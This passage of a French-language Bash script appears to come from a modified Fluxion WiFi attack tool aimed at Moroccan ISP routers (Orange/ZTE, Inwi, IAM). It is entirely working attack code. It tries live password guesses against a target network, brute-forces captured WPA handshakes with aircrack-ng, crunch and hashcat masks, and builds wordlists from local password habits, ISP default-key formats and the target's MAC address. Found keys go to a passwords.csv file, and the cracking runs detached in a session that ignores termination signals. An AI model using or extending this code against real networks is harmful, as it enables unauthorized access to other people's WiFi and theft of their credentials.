      ip addr flush dev "$wifiInterface" 2>/dev/null
      sleep 0.3
      
      # Try to connect
      wpa_supplicant -B -i "$wifiInterface" -c "$wpaConf" -D nl80211,wext 2>/dev/null
      sleep 3
      
      # Check WPA state
      local wpaState=$(wpa_cli -i "$wifiInterface" status 2>/dev/null | grep "wpa_state=")
      
      if [[ "$wpaState" == *"COMPLETED"* ]]; then
        # Try to get IP to confirm real connection
        timeout 5 dhclient -1 "$wifiInterface" 2>/dev/null
        
        local gotIP=$(ip addr show "$wifiInterface" 2>/dev/null | grep "inet " | grep -v "127.0.0.1")
        
        if [ -n "$gotIP" ]; then
          echo
          echo -e "  ${CGrn}✓ TROUVÉ: $pwd${CClr}"
          echo "$(date '+%Y-%m-%d %H:%M:%S'),$ssid,$bssid,$pwd,LIVE" >> "$crackedDir/passwords.csv"
          ((foundCount++))
          
          # Cleanup and continue to next network
          killall wpa_supplicant dhclient 2>/dev/null
          rm -f "$wpaConf"
          break
        fi
      fi
      
      killall wpa_supplicant 2>/dev/null
      rm -f "$wpaConf"
    done
  done
  
  echo
  echo
  echo -e "${CGrn}═══════════════════════════════════════════════${CClr}"
  echo -e "${CGrn}  Test terminé: $foundCount mots de passe trouvés${CClr}"
  echo -e "${CGrn}  Fichier: $crackedDir/passwords.csv${CClr}"
  echo -e "${CGrn}═══════════════════════════════════════════════${CClr}"
  echo
  echo -e "$FLUXIONVLine Appuyez sur Entrée pour continuer..."
  read
}

# ============================================================ #
# ============= < Direct Bruteforce Execution > ============== #
# ============================================================ #
fluxion_direct_bruteforce() {
  # Pick handshake
  if ! fluxion_smart_handshake_picker; then
    return 1
  fi
  
  local hashPath="$FluxionSelectedHandshake"
  local targetMAC="$FluxionTargetMAC"
  local targetSSID="$FluxionTargetSSID"
  
  source "$FLUXIONLibPath/ColorUtils.sh"
  
  fluxion_header
  echo -e "$FLUXIONVLine ${CGrn}=== CRACK INTELLIGENT MAROC ===${CClr}"
  echo -e "$FLUXIONVLine Cible: $targetSSID ($targetMAC)"
  echo -e "$FLUXIONVLine Fichier: $hashPath"
  echo
  
  # Detect ISP from SSID
  local detectedISP="unknown"
  if [[ "$targetSSID" =~ [Oo]range|[Zz][Tt][Ee]|[Ff]ibre ]]; then
    detectedISP="orange"
    echo -e "$FLUXIONVLine ${CYel}Détecté: ORANGE/ZTE${CClr}"
  elif [[ "$targetSSID" =~ [Ii]nwi|[Ii]nwee ]]; then
    detectedISP="inwi"
    echo -e "$FLUXIONVLine ${CYel}Détecté: INWI${CClr}"
  elif [[ "$targetSSID" =~ [Mm]aroc|[Ii][Aa][Mm] ]]; then
    detectedISP="iam"
    echo -e "$FLUXIONVLine ${CYel}Détecté: IAM/Maroc Telecom${CClr}"
  fi
  echo
  
  # Menu
  echo -e "$FLUXIONVLine ${CYel}Choisir le type de mot de passe:${CClr}"
  echo
  echo -e "  ${CGrn}━━━ ULTRA RAPIDES ━━━${CClr}"
  echo -e "\t${CRed}[${CSYel}1${CClr}${CRed}]${CClr} ${CGrn}PATTERNS MAROC${CClr} - Top passwords Maroc (~5 min)"
  echo -e "\t${CRed}[${CSYel}2${CClr}${CRed}]${CClr} 8 CHIFFRES - 00000000-99999999 (30-60 min)"
  echo
  echo -e "  ${CYel}━━━ DÉFAUTS FAI ━━━${CClr}"
  echo -e "\t${CRed}[${CSYel}3${CClr}${CRed}]${CClr} ORANGE ZTE FIBRE - 18 chars (MAJ+CHIFFRES)"
  echo -e "\t${CRed}[${CSYel}4${CClr}${CRed}]${CClr} INWI - 12 chars HEX (0-9, A-F)"
  echo -e "\t${CRed}[${CSYel}5${CClr}${CRed}]${CClr} IAM - 10 chars (MAJ+CHIFFRES)"
  echo
  echo -e "  ${CPrp}━━━ AVANCÉ ━━━${CClr}"
  echo -e "\t${CRed}[${CSYel}6${CClr}${CRed}]${CClr} HASHCAT GPU - Masks intelligents"
  echo -e "\t${CRed}[${CSYel}7${CClr}${CRed}]${CClr} PERSONNALISÉ - Définir charset/longueur"
  echo
  echo -e "\t${CRed}[${CSYel}0${CClr}${CRed}]${CClr} Retour"
  echo
  echo -ne "$FLUXIONPrompt"
  read method
  
  case "$method" in
    1) fluxion_launch_background_crack "morocco" "$hashPath" "$targetMAC" "$targetSSID" ;;
    2) fluxion_launch_background_crack "numeric8" "$hashPath" "$targetMAC" "$targetSSID" ;;
    3) fluxion_launch_background_crack "orange_zte" "$hashPath" "$targetMAC" "$targetSSID" ;;
    4) fluxion_launch_background_crack "inwi" "$hashPath" "$targetMAC" "$targetSSID" ;;
    5) fluxion_launch_background_crack "iam" "$hashPath" "$targetMAC" "$targetSSID" ;;
    6) fluxion_launch_background_crack "hashcat_smart" "$hashPath" "$targetMAC" "$targetSSID" ;;
    7) fluxion_launch_custom_crack "$hashPath" "$targetMAC" "$targetSSID" ;;
    *) return 0 ;;
  esac
}

# ============================================================ #
# ========== < Live Password Test (No Handshake) > =========== #
# ============================================================ #
fluxion_live_password_test() {
  local targetMAC="$1"
  local targetSSID="$2"
  
  source "$FLUXIONLibPath/ColorUtils.sh"
  
  fluxion_header
  echo -e "$FLUXIONVLine ${CRed}=== TEST LIVE - SANS HANDSHAKE ===${CClr}"
  echo -e "$FLUXIONVLine ${CYel}Connexion directe au réseau cible${CClr}"
  echo -e "$FLUXIONVLine Cible: $targetSSID ($targetMAC)"
  echo
  
  # Get interface
  interface_list_wireless
  if [ ${#InterfaceListWireless[@]} -eq 0 ]; then
    echo -e "${CRed}Aucune interface WiFi!${CClr}"
    sleep 2
    return 1
  fi
  
  local wifiInterface="${InterfaceListWireless[0]}"
  
  # Stop monitor mode if active
  airmon-ng stop "${wifiInterface}mon" &>/dev/null
  airmon-ng stop "$wifiInterface" &>/dev/null
  
  # Ensure interface is in managed mode
  ip link set "$wifiInterface" down 2>/dev/null
  iw dev "$wifiInterface" set type managed 2>/dev/null
  ip link set "$wifiInterface" up 2>/dev/null
  
  echo -e "$FLUXIONVLine Interface: ${CCyn}$wifiInterface${CClr}"
  echo
  
  # Top Moroccan passwords to test
  local passwords=(
    "2025@2026" "2026@2025" "2025@2025" "2026@2026"
    "2024@2025" "2025@2024" "2024@2024" "2027@2027"
    "2025@2030" "2026@2030" "2030@2030"
    "20252026" "20262025" "20252025" "20262026"
    "20242025" "20252024" "20272027" "20302030"
    "2025#2026" "2026#2025" "2025#2025"
    "Maroc2025" "Maroc2026" "maroc2025" "maroc2026"
    "MAROC2025" "MAROC2026" "Morocco2025" "Morocco2026"
    "wifi2025" "wifi2026" "WIFI2025" "WIFI2026"
    "pass2025" "pass2026" "password2025" "password2026"
    "orange2025" "orange2026" "Orange2025" "Orange2026"
    "inwi2025" "inwi2026" "admin2025" "admin2026"
    "12345678" "00000000" "11111111" "87654321"
    "azerty123" "qwerty123" "20250000" "20260000"
  )
  
  echo -e "$FLUXIONVLine ${CGrn}Test de ${#passwords[@]} mots de passe en direct...${CClr}"
  echo
  
  local found=""
  local count=0
  
  for pwd in "${passwords[@]}"; do
    ((count++))
    echo -ne "\r$FLUXIONVLine [$count/${#passwords[@]}] Test: ${CYel}$pwd${CClr}                    "
    
    # Create wpa_supplicant config
    local wpaConf="/tmp/wpa_test_$$.conf"
    cat > "$wpaConf" << EOF
network={
    ssid="$targetSSID"
    psk="$pwd"
    key_mgmt=WPA-PSK
}
EOF
    
    # Kill any existing wpa_supplicant
    killall wpa_supplicant 2>/dev/null
    sleep 0.5
    
    # Try to connect
    timeout 8 wpa_supplicant -i "$wifiInterface" -c "$wpaConf" -D nl80211,wext &>/dev/null &
    local wpaPID=$!
    
    sleep 4
    
    # Check if connected
    if iw dev "$wifiInterface" link 2>/dev/null | grep -q "Connected"; then
      found="$pwd"
      kill $wpaPID 2>/dev/null
      rm -f "$wpaConf"
      break
    fi
    
    kill $wpaPID 2>/dev/null
    rm -f "$wpaConf"
  done
  
  echo
  echo
  
  if [ "$found" ]; then
    echo -e "${CGrn}╔══════════════════════════════════════════════╗${CClr}"
    echo -e "${CGrn}║     🔓 MOT DE PASSE TROUVÉ EN LIVE! 🔓       ║${CClr}"
    echo -e "${CGrn}╠══════════════════════════════════════════════╣${CClr}"
    echo -e "${CGrn}║  $found${CClr}"
    echo -e "${CGrn}╚══════════════════════════════════════════════╝${CClr}"
    
    # Save to file
    local crackedDir="$FLUXIONPath/attacks/Bruteforce/cracked"
    mkdir -p "$crackedDir"
    echo "$(date '+%Y-%m-%d %H:%M:%S'),$targetSSID,$targetMAC,$found,LIVE" >> "$crackedDir/passwords.csv"
    echo
    echo -e "${CGrn}Sauvegardé: $crackedDir/passwords.csv${CClr}"
  else
    echo -e "${CRed}Mot de passe non trouvé dans les ${#passwords[@]} tests.${CClr}"
    echo -e "${CYel}Essayez l'option 1 (PATTERNS MAROC) pour plus de mots de passe.${CClr}"
  fi
  
  echo
  echo -e "$FLUXIONVLine Appuyez sur Entrée pour continuer..."
  read
}

# ============================================================ #
# ========== < Launch Background Crack Process > ============= #
# ============================================================ #
fluxion_launch_background_crack() {
  local method="$1"
  local hashPath="$2"
  local targetMAC="$3"
  local targetSSID="$4"
  
  source "$FLUXIONLibPath/ColorUtils.sh"
  
  local scriptFile="/tmp/fluxion_crack_$$.sh"
  local resultFile="/tmp/fluxion_result_$$.txt"
  local crackedDir="$FLUXIONPath/attacks/Bruteforce/cracked"
  
  mkdir -p "$crackedDir"
  
  # Create standalone crack script
  cat > "$scriptFile" << 'CRACK_SCRIPT'
#!/bin/bash
METHOD="$1"
HASH_PATH="$2"
TARGET_MAC="$3"
TARGET_SSID="$4"
RESULT_FILE="$5"
CRACKED_DIR="$6"

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}╔══════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║        FLUXION BACKGROUND CRACKER            ║${NC}"
echo -e "${GREEN}╠══════════════════════════════════════════════╣${NC}"
echo -e "${GREEN}║ Cible: $TARGET_SSID${NC}"
echo -e "${GREEN}║ MAC: $TARGET_MAC${NC}"
echo -e "${GREEN}║ Méthode: $METHOD${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════╝${NC}"
echo ""

WORDLIST_FILE="/tmp/fluxion_wordlist_$$.txt"

case "$METHOD" in
  "numeric8")
    echo -e "${YELLOW}━━━ BRUTEFORCE 8 CHIFFRES ━━━${NC}"
    echo -e "${YELLOW}Pattern: 00000000 → 99999999${NC}"
    echo -e "${YELLOW}Estimation: 30-60 min (CPU)${NC}"
    echo ""
    
    crunch 8 8 0123456789 2>/dev/null | aircrack-ng -b "$TARGET_MAC" -w - "$HASH_PATH" | tee "$RESULT_FILE"
    ;;
    
  "quick_test")
    echo -e "${YELLOW}━━━ TEST RAPIDE - TOP 100 MAROC ━━━${NC}"
    echo -e "${GREEN}Basé sur 2025@2026 confirmé!${NC}"
    echo ""
    
    # Top 100 most likely Moroccan passwords
    {
      # Year@Year (MOST LIKELY!)
      echo "2025@2026"
      echo "2026@2025"
      echo "2025@2025"
      echo "2026@2026"
      echo "2024@2025"
      echo "2025@2024"
      echo "2024@2024"
      echo "2024@2026"
      echo "2026@2024"
      echo "2027@2027"
      echo "2025@2027"
      echo "2027@2025"
      echo "2026@2027"
      echo "2027@2026"
      echo "2030@2030"
      echo "2025@2030"
      echo "2026@2030"
      
      # Year combos without separator
      echo "20252026"
      echo "20262025"
      echo "20252025"
      echo "20262026"
      echo "20242025"
      echo "20252024"
      echo "20242024"
      echo "20272027"
      echo "20302030"
      echo "20262030"
      echo "20252030"
      
      # Year#Year
      echo "2025#2026"
      echo "2026#2025"
      echo "2025#2025"
      echo "2026#2026"
      
      # Maroc patterns
      echo "Maroc2025"
      echo "Maroc2026"
      echo "maroc2025"
      echo "maroc2026"
      echo "MAROC2025"
      echo "MAROC2026"
      echo "Maroc@2025"
      echo "Maroc@2026"
      echo "Morocco2025"
      echo "Morocco2026"
      echo "2025Maroc"
      echo "2026Maroc"
      
      # wifi/pass patterns
      echo "wifi2025"
      echo "wifi2026"
      echo "WIFI2025"
      echo "WIFI2026"
      echo "pass2025"
      echo "pass2026"
      echo "Pass2025"
      echo "Pass2026"
      echo "password2025"
      echo "password2026"
      echo "2025wifi"
      echo "2026wifi"
      echo "2025pass"
      echo "2026pass"
      
      # ISP patterns
      echo "orange2025"
      echo "orange2026"
      echo "Orange2025"
      echo "Orange2026"
      echo "inwi2025"
      echo "inwi2026"
      echo "admin2025"
      echo "admin2026"
      
      # Common 8-digit
      echo "12345678"
      echo "00000000"
      echo "11111111"
      echo "87654321"
      echo "20250000"
      echo "20260000"
      echo "20251234"
      echo "20261234"
      echo "azerty123"
      echo "qwerty123"
      
      # Year + simple suffix
      echo "20251111"
      echo "20261111"
      echo "20250123"
      echo "20260123"
    } > "$WORDLIST_FILE"
    
    TOTAL=$(wc -l < "$WORDLIST_FILE")
    echo -e "${GREEN}Testing $TOTAL passwords...${NC}"
    echo ""
    
    # Show progress for each password
    while IFS= read -r pwd; do
      echo -ne "\rTest: $pwd                    "
      echo "$pwd" | aircrack-ng -b "$TARGET_MAC" -w - "$HASH_PATH" 2>/dev/null | grep -q "KEY FOUND" && {
        echo ""
        echo -e "${GREEN}✓ TROUVÉ: $pwd${NC}"
        echo "$pwd" > "$RESULT_FILE"
        break
      }
    done < "$WORDLIST_FILE"
    
    rm -f "$WORDLIST_FILE"
    ;;
    
  "morocco")
    echo -e "${YELLOW}━━━ PATTERNS MAROC OPTIMISÉS ━━━${NC}"
    echo -e "${YELLOW}Basé sur succès: 2025@2026${NC}"
    echo ""
    
    MAC_CLEAN=$(echo "$TARGET_MAC" | tr -d ':' | tr 'a-f' 'A-F')
    {
      # PRIORITY 1: Year@Year patterns (CONFIRMED WORKING!)
      for y1 in 2025 2026 2024 2027 2028 2029 2030 2023 2022 2021 2020; do
        for y2 in 2025 2026 2024 2027 2028 2029 2030 2023 2022 2021 2020; do
          echo "${y1}@${y2}"
          echo "${y1}#${y2}"
          echo "${y1}${y2}"
          echo "${y1}_${y2}"
          echo "${y1}-${y2}"
          echo "${y1}.${y2}"
        done
      done
      
      # Same year doubled
      for y in 2025 2026 2024 2027 2028 2029 2030 2023; do
        echo "${y}${y}"
        echo "${y}@${y}"
        echo "${y}#${y}"
      done
      
      # PRIORITY 2: Maroc/Morocco patterns
      for y in 2025 2026 2024 2027 2028 2029 2030; do
        echo "Maroc${y}"
        echo "maroc${y}"
        echo "MAROC${y}"
        echo "${y}Maroc"
        echo "${y}maroc"
        echo "Morocco${y}"
        echo "morocco${y}"
        echo "Maroc@${y}"
        echo "maroc@${y}"
      done
      
      # PRIORITY 3: wifi/pass combos
      for y in 2025 2026 2024 2027 2028 2029 2030 2023 2022; do
        for word in wifi WIFI Wifi pass PASS Pass password Password; do
          echo "${word}${y}"
          echo "${y}${word}"
          echo "${word}@${y}"
          echo "${y}@${word}"
        done
        echo "${y}0000"
        echo "${y}1234"
        echo "${y}1111"
        echo "${y}2025"
        echo "${y}2026"
      done
      
      # Common words + years
      for y in 2025 2026 2024; do
        for word in orange Orange ORANGE inwi Inwi INWI iam IAM admin Admin; do
          echo "${word}${y}"
          echo "${y}${word}"
          echo "${word}@${y}"
        done
      done
      
      # Common 8-digit
      echo "12345678"
      echo "00000000"
      echo "11111111"
      echo "87654321"
      echo "123456789"
      echo "1234567890"
      echo "azerty123"
      echo "qwerty123"
      
      # Common patterns
      seq -w 00000000 00009999
      seq -w 20200000 20309999
    } > "$WORDLIST_FILE"
    
    TOTAL=$(wc -l < "$WORDLIST_FILE")
    echo -e "${GREEN}Wordlist: $TOTAL passwords${NC}"
    echo -e "${YELLOW}Test en cours...${NC}"
    echo ""
    
    aircrack-ng -b "$TARGET_MAC" -w "$WORDLIST_FILE" "$HASH_PATH" | tee "$RESULT_FILE"
    rm -f "$WORDLIST_FILE"
    ;;
    
  "orange_zte")
    echo -e "${YELLOW}━━━ ORANGE ZTE FIBRE ━━━${NC}"
    echo -e "${YELLOW}Pattern: 18 chars MAJUSCULES + CHIFFRES${NC}"
    echo -e "${YELLOW}Exemple: 9NF4GP5S37KP529SNR${NC}"
    echo -e "${RED}ATTENTION: Très long! Des millions de combinaisons${NC}"
    echo ""
    
    if command -v hashcat &>/dev/null && command -v hcxpcapngtool &>/dev/null; then
      echo -e "${GREEN}Hashcat détecté - utilisation masks${NC}"
      HASH_22000="/tmp/fluxion_hash_$$.hc22000"
      hcxpcapngtool -o "$HASH_22000" "$HASH_PATH" 2>/dev/null
      
      # Mask: 18 chars uppercase + digits = ?1 (custom charset)
      # Try common patterns first
      hashcat -m 22000 -a 3 "$HASH_22000" -1 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' \
        '?1?1?1?1?1?1?1?1?1?1?1?1?1?1?1?1?1?1' \
        --increment --increment-min=12 -O 2>&1 | tee "$RESULT_FILE"
      rm -f "$HASH_22000"
    else
      echo -e "${RED}Pour Orange ZTE 18 chars, hashcat GPU est recommandé${NC}"
      echo -e "${YELLOW}Installation: sudo apt install hashcat hcxtools${NC}"
      echo ""
      echo -e "${YELLOW}Tentative avec patterns réduits...${NC}"
      
      # Try shorter patterns first
      crunch 12 12 ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 2>/dev/null | \
        head -n 10000000 | aircrack-ng -b "$TARGET_MAC" -w - "$HASH_PATH" | tee "$RESULT_FILE"
    fi
    ;;
    
  "inwi")
    echo -e "${YELLOW}━━━ INWI ━━━${NC}"
    echo -e "${YELLOW}Pattern: 12 chars HEX (0-9, A-F)${NC}"
    echo -e "${YELLOW}Exemple: D842F7067E29${NC}"
    echo ""
    
    if command -v hashcat &>/dev/null && command -v hcxpcapngtool &>/dev/null; then
      echo -e "${GREEN}Hashcat détecté - mode optimal${NC}"
      HASH_22000="/tmp/fluxion_hash_$$.hc22000"
      hcxpcapngtool -o "$HASH_22000" "$HASH_PATH" 2>/dev/null
      
      # 12 chars hex = 16^12 = très grand, mais hashcat peut gérer
      hashcat -m 22000 -a 3 "$HASH_22000" -1 '0123456789ABCDEF' \
        '?1?1?1?1?1?1?1?1?1?1?1?1' -O 2>&1 | tee "$RESULT_FILE"
      rm -f "$HASH_22000"
    else
      echo -e "${YELLOW}Bruteforce HEX 12 chars avec crunch...${NC}"
      crunch 12 12 0123456789ABCDEF 2>/dev/null | \
        aircrack-ng -b "$TARGET_MAC" -w - "$HASH_PATH" | tee "$RESULT_FILE"
    fi
    ;;
    
  "iam")
    echo -e "${YELLOW}━━━ IAM / MAROC TELECOM ━━━${NC}"
    echo -e "${YELLOW}Pattern: 10 chars MAJUSCULES + CHIFFRES${NC}"
    echo ""
    
    if command -v hashcat &>/dev/null && command -v hcxpcapngtool &>/dev/null; then
      echo -e "${GREEN}Hashcat détecté${NC}"
      HASH_22000="/tmp/fluxion_hash_$$.hc22000"
      hcxpcapngtool -o "$HASH_22000" "$HASH_PATH" 2>/dev/null
      
      hashcat -m 22000 -a 3 "$HASH_22000" -1 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' \
        '?1?1?1?1?1?1?1?1?1?1' -O 2>&1 | tee "$RESULT_FILE"
      rm -f "$HASH_22000"
    else
      echo -e "${YELLOW}Bruteforce 10 chars...${NC}"
      crunch 10 10 ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 2>/dev/null | \
        aircrack-ng -b "$TARGET_MAC" -w - "$HASH_PATH" | tee "$RESULT_FILE"
    fi
    ;;
    
  "hashcat_smart")
    echo -e "${YELLOW}━━━ HASHCAT SMART MODE ━━━${NC}"
    
    if ! command -v hashcat &>/dev/null; then
      echo -e "${RED}Hashcat non installé!${NC}"
      echo -e "${YELLOW}sudo apt install hashcat hcxtools${NC}"
      read -p "Appuyez sur Entrée..."
      exit 1
    fi
    
    HASH_22000="/tmp/fluxion_hash_$$.hc22000"
    hcxpcapngtool -o "$HASH_22000" "$HASH_PATH" 2>/dev/null
    
    echo -e "${GREEN}Test progressif des patterns...${NC}"
    
    # Test in order of probability
    MASKS=(
      "?d?d?d?d?d?d?d?d"                    # 8 digits
      "?d?d?d?d?d?d?d?d?d?d"                # 10 digits  
      "?u?u?u?u?u?u?u?u?u?u?u?u"            # 12 uppercase (Inwi-like)
    )
    
    for mask in "${MASKS[@]}"; do
      echo -e "${YELLOW}Testing: $mask${NC}"
      timeout 600 hashcat -m 22000 -a 3 "$HASH_22000" "$mask" \
        --outfile="$RESULT_FILE" --outfile-format=2 -O 2>&1
      
      if [ -s "$RESULT_FILE" ]; then
        echo -e "${GREEN}TROUVÉ!${NC}"
        break
      fi
    done
    
    rm -f "$HASH_22000"
    ;;
    
  *)
    echo -e "${RED}Méthode inconnue: $METHOD${NC}"
    ;;
esac

# Check result
echo ""
if [ -f "$RESULT_FILE" ]; then
  if grep -q "KEY FOUND" "$RESULT_FILE" 2>/dev/null; then
    PASSWORD=$(grep "KEY FOUND" "$RESULT_FILE" | grep -oP '\[\s*\K[^\]]+' | head -1)
  elif [ -s "$RESULT_FILE" ] && [ "$METHOD" = "hashcat" ]; then
    PASSWORD=$(cat "$RESULT_FILE" | head -1)
  fi
fi

if [ "$PASSWORD" ]; then
  echo -e "${GREEN}╔══════════════════════════════════════════════╗${NC}"
  echo -e "${GREEN}║       🔓 MOT DE PASSE TROUVÉ! 🔓             ║${NC}"
  echo -e "${GREEN}╠══════════════════════════════════════════════╣${NC}"
  echo -e "${GREEN}║  $PASSWORD${NC}"
  echo -e "${GREEN}╚══════════════════════════════════════════════╝${NC}"
  
  echo "$(date '+%Y-%m-%d %H:%M:%S'),$TARGET_SSID,$TARGET_MAC,$PASSWORD" >> "$CRACKED_DIR/passwords.csv"
  echo ""
  echo -e "${GREEN}Sauvegardé: $CRACKED_DIR/passwords.csv${NC}"
else
  echo -e "${RED}Mot de passe non trouvé.${NC}"
fi

echo ""
read -p "Appuyez sur Entrée pour fermer..."
CRACK_SCRIPT

  chmod +x "$scriptFile"
  
  # Create a wrapper that will keep running even if everything else closes
  local wrapperFile="/tmp/fluxion_wrapper_$$.sh"
  cat > "$wrapperFile" << WRAPPER
#!/bin/bash
# This wrapper ensures the crack process survives everything
trap '' HUP INT TERM  # Ignore all signals
cd /tmp
exec bash '$scriptFile' '$method' '$hashPath' '$targetMAC' '$targetSSID' '$resultFile' '$crackedDir'
WRAPPER
  chmod +x "$wrapperFile"
  
  # Try screen first (best option), then tmux, then xterm with full detachment
  if command -v screen &>/dev/null; then
    screen -dmS "fluxion_crack_$$" bash -c "bash '$wrapperFile'; exec bash"
    echo -e "${CGrn}✓ Crack lancé dans screen session: fluxion_crack_$$${CClr}"
    echo -e "${CYel}  Pour voir: screen -r fluxion_crack_$$${CClr}"
  elif command -v tmux &>/dev/null; then
    tmux new-session -d -s "fluxion_crack_$$" "bash '$wrapperFile'; read"
    echo -e "${CGrn}✓ Crack lancé dans tmux session: fluxion_crack_$$${CClr}"
    echo -e "${CYel}  Pour voir: tmux attach -t fluxion_crack_$$${CClr}"
  else
    # Fallback: use nohup + setsid + new process group
    ( setsid nohup xterm -hold -bg "#1a1a2e" -fg "#00ff00" -T "Fluxion Cracker: $targetSSID" \
      -e "bash '$wrapperFile'" </dev/null >/dev/null 2>&1 & )
    echo -e "${CGrn}✓ Crack lancé en xterm détaché${CClr}"
  fi
  
  disown -a 2>/dev/null
  
  echo ""
  echo -e "${CGrn}✓ Crack lancé en arrière-plan!${CClr}"
  echo -e "${CYel}  Retour automatique au menu...${CClr}"
  sleep 2
}

# ============================================================ #
# ============= < Fast Wordlist Method > ===================== #
# ============================================================ #
fluxion_fast_wordlist() {
  local hashPath="$1"
  local targetMAC="$2"
  local targetSSID="$3"
  
  source "$FLUXIONLibPath/ColorUtils.sh"
  
  local wordlistFile="/tmp/fluxion_smart_wordlist.txt"
  local resultFile="/tmp/fluxion_result.txt"
  
  fluxion_header
  echo -e "$FLUXIONVLine ${CGrn}Génération wordlist intelligente...${CClr}"
  echo
  
  # Create smart wordlist based on MAC and common patterns
  > "$wordlistFile"
  
  # Extract MAC parts (common in ZTE passwords)
  local macClean=$(echo "$targetMAC" | tr -d ':' | tr 'a-f' 'A-F')
  local macLast4="${macClean: -4}"
  local macLast6="${macClean: -6}"
  local macLast8="${macClean: -8}"
  
  echo -e "$FLUXIONVLine Patterns basés sur MAC: $macClean"
  
  # Common ZTE Orange patterns based on MAC
  {
    # MAC-based patterns (very common for ZTE)
    echo "$macLast8"
    echo "$macLast6"
    echo "$macLast4$macLast4"
    echo "ORANGE$macLast4"
    echo "Orange$macLast4"
    echo "orange$macLast4"
    echo "$macLast6$macLast6"
    
    # Common 8-digit numeric patterns
    echo "12345678"
    echo "00000000"
    echo "11111111"
    echo "12341234"
    echo "87654321"
    echo "01234567"
    echo "11223344"
    
    # Phone patterns (Morocco +212)
    echo "06000000"
    echo "07000000"
    echo "21200000"
    
    # Year-based patterns
    echo "20242024"
    echo "20232023"
    echo "20222022"
    echo "20212021"
    echo "20202020"
    
    # Generate MAC-derived 8-char combos
    for i in {0..9}{0..9}; do
      echo "$macLast6$i"
    done
    
    # Generate all 8-digit numbers with MAC prefix
    for i in {00..99}; do
      echo "$macLast4${i}${i}"
    done
    
  } >> "$wordlistFile"
  
  # Add numeric 8-digit range (100000 most common)
  echo -e "$FLUXIONVLine Ajout patterns numériques courants..."
  seq -w 00000000 00099999 >> "$wordlistFile"
  seq -w 10000000 10099999 >> "$wordlistFile"
  seq -w 12300000 12399999 >> "$wordlistFile"
  
  local wordCount=$(wc -l < "$wordlistFile")
  echo -e "$FLUXIONVLine ${CGrn}Wordlist: $wordCount mots de passe à tester${CClr}"
  echo
  
  # Run aircrack-ng with wordlist
  echo -e "$FLUXIONVLine ${CYel}Lancement du crack...${CClr}"
  
  rm -f "$resultFile"
  
  xterm -hold -bg "#000000" -fg "#00FF00" \
    -title "Cracking with Smart Wordlist ($wordCount passwords)" -e \
    "aircrack-ng -b '$targetMAC' -w '$wordlistFile' '$hashPath' 2>&1 | tee '$resultFile'" &
  local crackPID=$!
  
  # Monitor
  while kill -0 $crackPID 2>/dev/null; do
    sleep 2
    if [ -f "$resultFile" ] && grep -q "KEY FOUND" "$resultFile" 2>/dev/null; then
      local found=$(grep "KEY FOUND" "$resultFile" | grep -oP '\[\s*\K[^\]]+' | head -1)
      kill $crackPID 2>/dev/null
      fluxion_show_password_found "$found" "$targetSSID" "$targetMAC"
      rm -f "$wordlistFile"
      return 0
    fi
  done
  
  # Check final result
  if [ -f "$resultFile" ] && grep -q "KEY FOUND" "$resultFile" 2>/dev/null; then
    local found=$(grep "KEY FOUND" "$resultFile" | grep -oP '\[\s*\K[^\]]+' | head -1)
    fluxion_show_password_found "$found" "$targetSSID" "$targetMAC"
  else
    echo -e "\n${CRed}Mot de passe non trouvé avec la wordlist intelligente.${CClr}"
    echo -e "${CYel}Essayez le mode GPU ou Bruteforce complet.${CClr}"
  fi
  
  rm -f "$wordlistFile"
  
  echo ""
  echo -e "$FLUXIONVLine Appuyez sur Entrée..."
  read
}

# ============================================================ #
# ================ < Hashcat GPU Method > ==================== #
# ============================================================ #
fluxion_hashcat_crack() {
  local hashPath="$1"
  local targetMAC="$2"
  local targetSSID="$3"
  
  source "$FLUXIONLibPath/ColorUtils.sh"
  
  fluxion_header
  echo -e "$FLUXIONVLine ${CGrn}=== MODE HASHCAT GPU ===${CClr}"
  echo
  
  # Check if hashcat is installed
  if ! command -v hashcat &> /dev/null; then
    echo -e "${CRed}Hashcat n'est pas installé!${CClr}"
    echo -e "Installer avec: ${CCyn}sudo apt install hashcat${CClr}"
    echo ""
    echo -e "$FLUXIONVLine Appuyez sur Entrée..."
    read
    return 1
  fi
  
  # Check if hcxpcapngtool is installed for conversion
  local hccapxFile="/tmp/fluxion_hash.hc22000"
  
  if command -v hcxpcapngtool &> /dev/null; then
    echo -e "$FLUXIONVLine Conversion vers format hashcat..."
    hcxpcapngtool -o "$hccapxFile" "$hashPath" 2>/dev/null
  elif command -v cap2hccapx &> /dev/null; then
    echo -e "$FLUXIONVLine Conversion vers format hccapx..."
    local hccapxOld="/tmp/fluxion_hash.hccapx"
    cap2hccapx "$hashPath" "$hccapxOld" 2>/dev/null
    hccapxFile="$hccapxOld"
  else
    echo -e "${CRed}hcxpcapngtool ou cap2hccapx requis!${CClr}"
    echo -e "Installer avec: ${CCyn}sudo apt install hcxtools${CClr}"
    echo ""
    echo -e "$FLUXIONVLine Appuyez sur Entrée..."
    read
    return 1
  fi
  
  if [ ! -f "$hccapxFile" ] || [ ! -s "$hccapxFile" ]; then
    echo -e "${CRed}Échec de conversion du fichier!${CClr}"
    echo ""
    echo -e "$FLUXIONVLine Appuyez sur Entrée..."
    read
    return 1
  fi
  
  echo -e "$FLUXIONVLine ${CGrn}Fichier converti: $hccapxFile${CClr}"
  echo
  
  # Generate smart wordlist
  local wordlistFile="/tmp/fluxion_smart_wordlist.txt"
  local macClean=$(echo "$targetMAC" | tr -d ':' | tr 'a-f' 'A-F')
  
  > "$wordlistFile"
  
  # Quick smart patterns
  {
    echo "${macClean: -8}"
    echo "${macClean: -6}${macClean: -6:2}"
    seq -w 00000000 00999999
  } >> "$wordlistFile"
  
  echo -e "$FLUXIONVLine ${CYel}Lancement hashcat (GPU)...${CClr}"
  echo -e "$FLUXIONVLine ${CGrn}~10-100x plus rapide qu'aircrack!${CClr}"
  echo
  
  # Determine hashcat mode based on file format
  local hashMode="22000"  # WPA-PBKDF2-PMKID+EAPOL
  if [[ "$hccapxFile" == *.hccapx ]]; then
    hashMode="2500"  # Legacy WPA
  fi
  
  local resultFile="/tmp/fluxion_hashcat_result.txt"
  rm -f "$resultFile"
  
  # Run hashcat
  xterm -hold -bg "#000000" -fg "#00FF00" \
    -title "Hashcat GPU Crack" -e \
